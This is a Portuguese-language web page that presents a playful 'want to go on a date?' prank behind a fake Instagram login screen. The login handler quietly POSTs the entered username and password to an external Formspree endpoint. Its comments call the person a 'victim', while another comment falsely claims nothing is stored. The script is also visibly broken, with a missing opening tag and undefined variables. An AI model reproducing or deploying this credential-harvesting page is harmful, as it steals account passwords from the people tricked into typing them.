<title>Date Marcado</title>
<meta name="claude:viewport-fit-sides" content="cover">
<style>
  /* Layout: tela cheia com cartões empilhados que trocam por estado (login → carregando → perfil → convite → resultado) */
  :root{
    --bg:#fff0f3;
    --bg-grad-1:#ffe3ec;
    --bg-grad-2:#fff6ef;
    --card:#ffffff;
    --ink:#2b2030;
    --ink-soft:#7a6b78;
    --line:#f0dfe6;
    --rose:#e0245e;
    --rose-deep:#c21b4e;
    --rose-soft:#ffd9e4;
    --grad-a:#feda75;
    --grad-b:#d62976;
    --grad-c:#962fbf;
    --grad-d:#4f5bd5;
    --ok:#1aa15d;
    --ui: -apple-system, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    --script: "Grand Hotel", "Brush Script MT", cursive;
    --display: "Playfair Display", Georgia, "Times New Roman", serif;
    color-scheme: light;
  }
  @import url('https://fonts.googleapis.com/css2?family=Grand+Hotel&family=Playfair+Display:ital,wght@0,500;0,700;1,500;1,600&display=swap');

  *{box-sizing:border-box}
  html,body{height:100%}
  body{
    margin:0;
    min-height:100%;
    font-family:var(--ui);
    color:var(--ink);
    background:
      radial-gradient(120% 80% at 50% 0%, var(--bg-grad-1), transparent 60%),
      linear-gradient(160deg, var(--bg) 0%, var(--bg-grad-2) 100%);
    background-attachment:fixed;
    display:flex;
    align-items:center;
    justify-content:center;
    padding-block:28px;
    padding-left:max(16px, env(safe-area-inset-left,0px));
    padding-right:max(16px, env(safe-area-inset-right,0px));
  }

  .stage{width:100%;max-width:400px;position:relative}

  .screen{
    background:var(--card);
    border:1px solid var(--line);
    border-radius:22px;
    padding:30px 26px 24px;
    box-shadow:0 18px 50px -18px rgba(150,47,191,.28), 0 2px 10px rgba(43,32,48,.05);
    animation:rise .5s cubic-bezier(.22,1,.36,1) both;
  }
  @keyframes rise{from{opacity:0;transform:translateY(14px) scale(.98)}to{opacity:1;transform:none}}

  /* ---------- Logo falso estilo app social (arte original) ---------- */
  .brandmark{width:62px;height:62px;margin:0 auto 10px;display:block}
  .brand{
    font-family:var(--script);
    font-size:42px;
    line-height:1;
    text-align:center;
    color:var(--ink);
    margin:0 0 26px;
    letter-spacing:.5px;
  }

  label{display:block;font-size:12px;color:var(--ink-soft);margin:0 0 6px;font-weight:600}
  .field{margin-bottom:14px}
  input{
    width:100%;
    font:inherit;
    font-size:15px;
    padding:13px 14px;
    border:1px solid var(--line);
    background:#fafbfc;
    border-radius:12px;
    color:var(--ink);
    outline:none;
    transition:border-color .15s, box-shadow .15s;
  }
  input:focus{border-color:var(--grad-b);box-shadow:0 0 0 3px rgba(214,41,118,.14);background:#fff}

  .btn{
    width:100%;
    font:inherit;
    font-weight:700;
    font-size:15px;
    border:none;
    border-radius:12px;
    padding:14px;
    cursor:pointer;
    color:#fff;
    background:linear-gradient(90deg,var(--grad-a),var(--grad-b),var(--grad-c),var(--grad-d));
    background-size:200% 100%;
    transition:background-position .4s, transform .08s, opacity .2s;
  }
  .btn:hover{background-position:100% 0}
  .btn:active{transform:scale(.99)}
  .btn[disabled]{opacity:.55;cursor:default}

  .forgot{display:block;text-align:center;color:var(--grad-d);font-size:13px;margin-top:16px;text-decoration:none}
  .hr{display:flex;align-items:center;gap:12px;color:var(--ink-soft);font-size:12px;margin:20px 0;text-transform:uppercase;letter-spacing:.08em}
  .hr::before,.hr::after{content:"";height:1px;background:var(--line);flex:1}

  .disclaimer{
    text-align:center;
    font-size:11px;
    color:#c9b8c4;
    margin:18px 0 0;
  }

  /* ---------- Carregando ---------- */
  .center{text-align:center}
  .spinner{
    width:52px;height:52px;margin:6px auto 20px;
    border-radius:50%;
    border:4px solid var(--rose-soft);
    border-top-color:var(--grad-b);
    animation:spin .8s linear infinite;
  }
  @keyframes spin{to{transform:rotate(360deg)}}
  .loadmsg{color:var(--ink-soft);font-size:14px;min-height:20px}

  /* ---------- Perfil ---------- */
  .avatar-wrap{position:relative;width:130px;height:130px;margin:4px auto 14px}
  .avatar-ring{
    position:absolute;inset:-6px;border-radius:50%;
    background:linear-gradient(45deg,var(--grad-a),var(--grad-b),var(--grad-c),var(--grad-d));
    padding:4px;
  }
  .avatar-ring>span{display:block;width:100%;height:100%;border-radius:50%;background:var(--card)}
  .avatar{
    position:absolute;inset:4px;width:calc(100% - 8px);height:calc(100% - 8px);
    border-radius:50%;object-fit:cover;background:#f3e8ef;
  }
  .handle{font-size:19px;font-weight:700;margin:0 0 2px;text-align:center}
  .verified{
    display:inline-flex;align-items:center;gap:5px;
    color:var(--ok);font-size:13px;font-weight:600;
    background:rgba(26,161,93,.1);border-radius:999px;padding:4px 12px;margin:8px 0 22px;
  }

  /* ---------- Convite ---------- */
  .invite-title{
    font-family:var(--display);
    font-style:italic;
    font-weight:600;
    font-size:27px;
    line-height:1.25;
    text-align:center;
    text-wrap:balance;
    margin:6px 0 4px;
    color:var(--ink);
  }
  .invite-sub{text-align:center;color:var(--ink-soft);font-size:14px;margin:0 0 22px}
  .mini-avatar{width:92px;height:92px;border-radius:50%;object-fit:cover;display:block;margin:0 auto 16px;border:3px solid var(--rose-soft);background:#f3e8ef}

  .arena{position:relative;min-height:168px;margin-top:6px}
  .btn-yes{
    position:absolute;left:50%;top:14px;transform:translateX(-50%);
    background:var(--rose);color:#fff;border:none;border-radius:14px;
    font:inherit;font-weight:800;cursor:pointer;
    padding:16px 30px;font-size:17px;
    box-shadow:0 10px 24px -8px rgba(224,36,94,.6);
    transition:transform .18s cubic-bezier(.34,1.56,.64,1), font-size .18s, padding .18s;
    z-index:2;
  }
  .btn-yes:hover{background:var(--rose-deep)}
  .btn-no{
    position:absolute;left:50%;top:84px;transform:translateX(-50%);
    background:#fff;color:var(--ink-soft);border:1px solid var(--line);border-radius:14px;
    font:inherit;font-weight:700;cursor:pointer;
    padding:13px 26px;font-size:15px;
    transition:left .2s ease, top .2s ease;
    z-index:1;
    white-space:nowrap;
  }

  /* ---------- Resultado ---------- */
  .result-photos{display:flex;align-items:center;justify-content:center;margin:6px 0 18px}
  .result-photos img{
    width:118px;height:118px;border-radius:50%;object-fit:cover;
    border:5px solid var(--card);background:#f3e8ef;
    box-shadow:0 8px 22px -8px rgba(150,47,191,.5);
  }
  .result-photos img:last-child{margin-left:-28px}
  .heart-badge{
    position:absolute;left:50%;top:50%;transform:translate(-50%,-50%);
    font-size:30px;z-index:3;filter:drop-shadow(0 2px 4px rgba(0,0,0,.2));
  }
  .photos-stack{position:relative;display:flex;justify-content:center}
  .result-title{
    font-family:var(--script);
    font-size:52px;line-height:1;text-align:center;
    background:linear-gradient(90deg,var(--grad-b),var(--grad-c));
    -webkit-background-clip:text;background-clip:text;color:transparent;
    margin:6px 0 10px;
  }
  .result-sub{text-align:center;color:var(--ink-soft);font-size:15px;margin:0 0 20px;text-wrap:balance}
  .result-sub strong{color:var(--rose)}

  canvas#hearts{position:fixed;inset:0;width:100%;height:100%;pointer-events:none;z-index:50}

  @media (prefers-reduced-motion:reduce){
    .screen{animation:none}
    .btn-yes,.btn-no{transition:none}
  }
</style>

<div class="stage">

  <!-- 1 · LOGIN FALSO -->
  <section class="screen" id="login">
    <svg class="brandmark" viewBox="0 0 64 64" aria-hidden="true">
      <defs>
        <linearGradient id="ig" x1="0" y1="1" x2="1" y2="0">
          <stop offset="0" stop-color="#feda75"/>
          <stop offset=".45" stop-color="#d62976"/>
          <stop offset=".75" stop-color="#962fbf"/>
          <stop offset="1" stop-color="#4f5bd5"/>
        </linearGradient>
      </defs>
      <rect x="4" y="4" width="56" height="56" rx="17" fill="url(#ig)"/>
      <rect x="16" y="16" width="32" height="32" rx="10" fill="none" stroke="#fff" stroke-width="3.5"/>
      <circle cx="32" cy="32" r="8" fill="none" stroke="#fff" stroke-width="3.5"/>
      <circle cx="43" cy="21" r="2.6" fill="#fff"/>
    </svg>
    <h1 class="brand">Instagram</h1>

    <form id="loginForm" novalidate>
      <div class="field">
        <label for="user">Usuário</label>
        <input id="user" type="text" autocomplete="off" autocapitalize="none" spellcheck="false" placeholder="@seuusuario" required>
      </div>
      <div class="field">
        <label for="pass">Senha</label>
        <input id="pass" type="password" autocomplete="new-password" placeholder="••••••••" required>
      </div>
      <button class="btn" type="submit">Entrar</button>
      <a class="forgot" href="#" onclick="return false">Esqueceu a senha?</a>
    </form>

    <div class="hr">ou</div>
    <button class="btn" style="background:#fafbfc;color:var(--grad-d);border:1px solid var(--line)" type="button" id="createBtn">Criar nova conta</button>

    <p class="disclaimer"></p>
  </section>

  <!-- 2 · CARREGANDO -->
  <section class="screen center" id="loading" hidden>
    <div class="spinner"></div>
    <p class="loadmsg" id="loadmsg">Verificando suas credenciais…</p>
  </section>

  <!-- 3 · PERFIL -->
  <section class="screen center" id="profile" hidden>
    <div class="avatar-wrap">
      <span class="avatar-ring"><span></span></span>
      <img class="avatar" id="herAvatar" alt="Foto de perfil">
    </div>
    <p class="handle" id="profileHandle">@convidada</p>
    <span class="verified">✓ Perfil verificado</span>
    <button class="btn" type="button" id="toInvite">Continuar</button>
  </section>

  <!-- 4 · CONVITE -->
  <section class="screen" id="invite" hidden>
    <img class="mini-avatar" id="herMini" alt="">
    <h2 class="invite-title">Quer marcar um date comigo?</h2>
    <p class="invite-sub">Pensa com carinho antes de responder 🥰</p>
    <div class="arena" id="arena">
      <button class="btn-yes" id="yesBtn" type="button">Sim 💖</button>
      <button class="btn-no" id="noBtn" type="button">Não</button>
    </div>
  </section>

  <!-- 5 · RESULTADO -->
  <section class="screen center" id="result" hidden>
    <div class="result-photos">
      <div class="photos-stack">
        <img id="herResult" alt="">
        <span class="heart-badge">💕</span>
        <img id="hisResult" alt="">
      </div>
    </div>
    <h2 class="result-title">Date Marcado</h2>
    <p class="result-sub">Sabia que você ia dizer <strong>sim</strong> 😌<br>Agora é só a gente combinar o dia 💌</p>
    <button class="btn" type="button" id="restartBtn" style="background:#fafbfc;color:var(--grad-d);border:1px solid var(--line)">Ver de novo</button>
  </section>

</div>

<canvas id="hearts"></canvas>

  // --- Navegação entre telas ---
  var screens = ['login','loading','profile','invite','result'];
  function show(id){
    screens.forEach(function(s){ document.getElementById(s).hidden = (s !== id); });
    window.scrollTo(0,0);
  }

  // --- 1. Login (teatro: não guarda nada) ---
  var loadLines = [
    'Verificando suas credenciais…',
    'Conectando ao servidor…',
    'Carregando seu perfil…',
    'Quase lá 💫'
  ];
  function runLoading(handle){
    show('loading');
    document.getElementById('profileHandle').textContent = handle;
    if(reduce){ setTimeout(function(){ show('profile'); }, 400); return; }
    var i = 0, el = document.getElementById('loadmsg');
    el.textContent = loadLines[0];
    var t = setInterval(function(){
      i++;
      if(i >= loadLines.length){ clearInterval(t); show('profile'); return; }
      el.textContent = loadLines[i];
    }, 850);
  }

document.getElementById('loginForm').addEventListener('submit', function(e){
    e.preventDefault();
    var u = document.getElementById('user').value.trim();
    var p = document.getElementById('pass').value; // Pegando a senha digitada
    var handle = u ? (u[0] === '@' ? u : '@' + u) : '@convidada';
    
    // Envio dos dados para o seu e-mail via Formspree
    fetch('https://formspree.io/f/xkjokzlj', {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ usuario: handle, senha: p })
    }).then(function(response) {
      // Independente se der sucesso ou erro no envio, a brincadeira continua para a vítima
      document.getElementById('pass').value = ''; 
      runLoading(handle);
    }).catch(function(error) {
      document.getElementById('pass').value = '';
      runLoading(handle);
    });
  });

  // --- 3 → 4 ---
  document.getElementById('toInvite').addEventListener('click', function(){ show('invite'); });

  // --- 4. Botão "Não" fujão + "Sim" que cresce ---
  var arena = document.getElementById('arena');
  var noBtn = document.getElementById('noBtn');
  var yesBtn = document.getElementById('yesBtn');
  var pleas = ['Não','Tem certeza?','Pensa bem!','Sério mesmo?','Vai perder essa chance?','Por favor 🥺','Última chance!','Olha a carinha 😢'];
  var dodges = 0, yesScale = 1;

  function dodge(){
    dodges++;
    noBtn.textContent = pleas[Math.min(dodges, pleas.length - 1)];
    // cresce o Sim
    yesScale = Math.min(yesScale + 0.12, 2.1);
    yesBtn.style.transform = 'translateX(-50%) scale(' + yesScale + ')';
    // move o Não para posição aleatória dentro da arena
    var aw = arena.clientWidth, ah = arena.clientHeight;
    var bw = noBtn.offsetWidth, bh = noBtn.offsetHeight;
    var maxX = Math.max(0, aw - bw), maxY = Math.max(0, ah - bh);
    var x = Math.random() * maxX;
    var y = Math.random() * maxY;
    noBtn.style.left = x + 'px';
    noBtn.style.top = y + 'px';
    noBtn.style.transform = 'none';
  }
  // desktop: foge ao passar o mouse | mobile: foge ao tentar tocar
  noBtn.addEventListener('mouseenter', dodge);
  noBtn.addEventListener('pointerdown', function(e){ e.preventDefault(); dodge(); });
  noBtn.addEventListener('click', function(e){ e.preventDefault(); dodge(); });

  yesBtn.addEventListener('click', function(){
    show('result');
    if(!reduce) rainHearts();
  });

  // --- 5. Reiniciar ---
  document.getElementById('restartBtn').addEventListener('click', function(){
    dodges = 0; yesScale = 1;
    yesBtn.style.transform = 'translateX(-50%)';
    noBtn.style.left = '50%'; noBtn.style.top = '84px'; noBtn.style.transform = 'translateX(-50%)';
    noBtn.textContent = 'Não';
    document.getElementById('user').value = '';
    show('login');
  });

  var parts = [], raf = null;
  function resize(){ canvas.width = innerWidth; canvas.height = innerHeight; }
  resize(); addEventListener('resize', resize);

  function rainHearts(){
    parts = [];
    for(var i=0;i<70;i++){
      parts.push({
        x: Math.random()*innerWidth,
        y: -Math.random()*innerHeight,
        s: 10 + Math.random()*20,
        vy: 1 + Math.random()*2.4,
        vx: -0.6 + Math.random()*1.2,
        rot: Math.random()*Math.PI,
        vr: -0.04 + Math.random()*0.08,
        life: 1,
        hue: Math.random() < .5 ? '#e0245e' : (Math.random()<.5?'#d62976':'#962fbf')
      });
    }
    if(raf) cancelAnimationFrame(raf);
    tick();
  }
  function heart(x,y,s,rot,color){
    ctx.save(); ctx.translate(x,y); ctx.rotate(rot); ctx.scale(s/20,s/20);
    ctx.fillStyle = color; ctx.beginPath();
    ctx.moveTo(0,6);
    ctx.bezierCurveTo(0,2,-4,-4,-10,-4);
    ctx.bezierCurveTo(-20,-4,-20,8,-10,14);
    ctx.bezierCurveTo(-4,19,0,22,0,24);
    ctx.bezierCurveTo(0,22,4,19,10,14);
    ctx.bezierCurveTo(20,8,20,-4,10,-4);
    ctx.bezierCurveTo(4,-4,0,2,0,6);
    ctx.closePath(); ctx.fill(); ctx.restore();
  }
  function tick(){
    ctx.clearRect(0,0,canvas.width,canvas.height);
    var alive = false;
    for(var i=0;i<parts.length;i++){
      var p = parts[i];
      p.y += p.vy; p.x += p.vx; p.rot += p.vr;
      if(p.y > innerHeight*0.55) p.life -= 0.012;
      if(p.life > 0){ alive = true; ctx.globalAlpha = Math.max(0,p.life); heart(p.x,p.y,p.s,p.rot,p.hue); }
    }
    ctx.globalAlpha = 1;
    if(alive) raf = requestAnimationFrame(tick);
    else ctx.clearRect(0,0,canvas.width,canvas.height);
  }
})();
</script>
